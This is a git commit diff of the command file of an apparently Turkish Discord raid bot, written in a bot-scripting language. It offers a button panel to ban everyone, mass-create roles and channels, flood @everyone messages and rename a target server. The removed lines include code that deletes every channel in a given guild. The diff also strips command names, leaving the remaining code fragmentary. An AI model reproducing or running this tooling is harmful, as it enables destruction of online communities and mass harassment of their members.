ff16a6d120eec990883d6c5a43ee89584c435638
Just <110572436+just1nwashere@users.noreply.github.com>
2025-05-29 11:10:45 +0300

    Update and rename @server.js to server.js

--- src/commands/server.js
+++ src/commands/server.js
@@ -1,64 +1,41 @@
 module.exports = [{
-          name: "server",
           code: `
-          $title[Sunucu P.neli]
+          $title[Sunucu]
           $addButton[1;Herkesi Banla!;danger;button5;false;<:Ban_Icon_just1n0057:1214605193271058484>]
           $addButton[1;Rol Spamla;success;button4;false;<:redcikis_just1n0057:1216601725423845498>]
           $addButton[1;Kanal Spamla;primary;button1;false;<:mavi_yazikanali_just1n0057:1216046025362505883>]
           $addButton[1;Mesaj Spamla;primary;button2;false;<:redcikis_just1n0057:1216601725423845498>]
           $addButton[1;Sunucu İsim/Avatar;primary;button3;false;<a:gulmek_just1n0057:1214601561351651409>]
           $color[#ffe46c]
-          $onlyForIDs[845223135111544832;]
+          $onlyForIDs[;]
           `
       }, {
-          name: "button1",
-          type: "interaction",
-          prototype: "button",
           code: `
           $interactionModal[Sunucu İD'si Girin;kanalxd;
           {actionRow:
-              {textInput:Sunucu İDsi:1:kanalInput:true:Sunucu İD:2:100}
+              {textInput:Sunucu İDsi:1:kanalInput:true:Sunucu İD:2}
           }]
           `
       }, {
-          name: "kanalxd",
-          type: "interaction",
-          prototype: "modal",
           code: `
           $interactionReply[$textInputValue[idInput] ID'li Sunucuda Kanal Sp.mlandı!;everyone;true;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Voice;false]
-          $createChannel[$textInputValue[kanalInput];just-sikti;Text;false]
-          $djsEval[
-            const guildId = '$textInputValue[kanalInput]';
-            const guild = client.guilds.cache.get(guildId);
-            
-            if (!guild) {
-                console.log("Sunucu bulunamadı ya da bot o sunucuda değil.");
-            } else {
-                guild.channels.cache.forEach((channel) => {
-                    channel.delete().catch(console.error);
-                });
-                console.log('Tüm Kanallar Silindi!');
-            }
-            ;]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
+          $createChannel[$textInputValue[kanalInput];;Voice;false]
+          $createChannel[$textInputValue[kanalInput];;Text;false]
             
           `
       }, {
-          name: "button2",
-          type: "interaction",
-          prototype: "button",
           code: `
           $interactionModal[Spam İçin Kanal İD!;spamxd;
           {actionRow:
@@ -66,9 +43,6 @@ module.exports = [{
           }]
           `
       }, {
-          name: "spamxd",
-          type: "interaction",
-          prototype: "modal",
           code: `
           $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
           $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
@@ -104,9 +78,6 @@ module.exports = [{
           $channelSendMessage[$textInputValue[idInput];@everyone Aga bee]
           `
       }, {
-          name: "button3",
-          type: "interaction",
-          prototype: "button",
           code: `
           $interactionModal[Sunucu/Avatar Değişim!;sunucuxd;
           {actionRow:
@@ -120,18 +91,12 @@ module.exports = [{
           }]
           `
       }, {
-          name: "sunucuxd",
-          type: "interaction",
-          prototype: "modal",
           code: `
           $interactionReply[$textInputValue[idInput] ID'li Sunucunun Profil & Avatarı Değiştirildi!;everyone;true;false]
           $setGuildName[$textInputValue[isimInput];$textInputValue[idInput]]
           $setGuildIcon[$textInputValue[avatarInput];$textInputValue[idInput]]
           `
       }, {
-          name: "button4",
-          type: "interaction",
-          prototype: "button",
           code: `
           $interactionModal[Sunucu İDsi Girin!;rolexd;
           {actionRow:
@@ -139,9 +104,6 @@ module.exports = [{
           }]
           `
       }, {
-          name: "rolexd",
-          type: "interaction",
-          prototype: "modal",
           code: `
           $interactionReply[$textInputValue[idInput] ID'li Sunucuda Rol Sp.mlandı;everyone;true;false]
           $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
@@ -170,9 +132,6 @@ module.exports = [{
           $createRole[$textInputValue[roleInput];SUNUCUNUN İÇİNDEN GEÇTİK;FF0000;10]
           `
       }, {
-          name: "button5",
-          type: "interaction",
-          prototype: "button",
           code: `
           $interactionModal[Lütfen Aşağıdaki Bilgileri Doldurun!;banlaxd;
           {actionRow:
@@ -183,9 +142,6 @@ module.exports = [{
           }
           ]`
       }, {
-          name: "banlaxd",
-          type: "interaction",
-          prototype: "modal",
           code: `
 
           $dm[$textInputValue[userInput]]
